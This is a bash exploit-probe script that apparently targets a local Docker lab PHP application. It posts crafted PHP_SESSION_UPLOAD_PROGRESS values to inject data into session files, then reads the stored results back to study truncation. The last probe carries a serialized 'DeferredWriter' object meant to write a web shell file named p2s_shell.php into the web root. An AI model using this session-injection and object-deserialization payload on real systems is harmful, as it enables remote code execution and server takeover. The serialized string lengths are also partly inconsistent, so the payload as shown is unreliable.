#!/bin/bash
# ukey truncation probe: POST marker values, dump what the hook stores
probe() {
  local sid="$1"; local val="$2"
  curl -s -o /dev/null -b "PHPSESSID=$sid" \
    -F "PHP_SESSION_UPLOAD_PROGRESS=$val" \
    -F "f=@/etc/hostname;filename=n.txt" \
    http://127.0.0.1:8085/up.php
  echo "sent : [$val]"
  echo "stored: [$(docker exec van85 cat /tmp/sess_$sid 2>/dev/null | head -c 200 | sed 's/;a:5:.*//' )]"
  echo
}
probe t0000000000000000000000000001 'injAAAA|BBBB'
probe t0000000000000000000000000002 'injAAAA;BBBB'
probe t0000000000000000000000000003 'injX|O:14:"DeferredWriter":2:{s:4:"path";s:26:"/var/www/html/p2s_shell.php";s:4:"data";s:29:"xy";}'
